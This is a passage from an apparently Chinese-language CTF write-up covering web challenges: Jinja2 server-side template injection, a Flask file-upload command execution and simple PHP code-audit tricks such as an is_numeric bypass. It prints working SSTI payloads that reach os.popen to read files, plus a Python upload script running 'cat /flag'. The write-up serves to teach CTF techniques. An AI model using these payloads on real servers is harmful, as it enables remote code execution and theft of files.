    if "flag{" in resp:
        print(resp)
        break

服务端模板注入(SSTI)

Jinjia2

Simple_SSTI_1

需要传个参数，上面随便传一个参数，给出提示，这个参数名为flag。

payload

http://114.67.246.176:18833/?flag={{config}}

Simple_SSTI_2

思路为先看Object下的所有子类，使用以下的payload即可

/?flag={{[].__class__.__base__.__subclasses__()}}

然后再找warningmessage这个类，可以带出来os类

看到这个类在第177个位置，然后带出来os。。。

失败，看看别人怎么写的

{{ config.__class__.__init__.__globals__['os'].popen('cat ./flag').read() }}

唔，还行，半懂不懂就这样吧，config延展出来的init再globals就有os了。

命令执行

python

Flask_FileUpload

看源码发现注释

<!-- Give me the file, and I will return the Running results by python to you! -->

先写一个py文件，内容为

import os
os.system('cat /flag')

然后改后缀名为jpg上传，上传成功之后查看源码即可发现flag。

php代码审计

签到类型

GET

$what=$_GET['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';

payload

/?what=flag

POST

$what=$_POST['what'];
echo $what;
if($what=='flag')
echo 'flag{****}';

payload

技巧类型

矛盾(is_numeric漏洞)

$num=$_GET['num'];
if(!is_numeric($num)) {
    echo $num;
    if($num==1)
    echo 'flag{**********}';
}

is_numeric会将前面是数字，后面是字符的字符串判断为错，然后这个被判断的变量后面的字符会被去掉，所以这里的payload为

/?num=1e
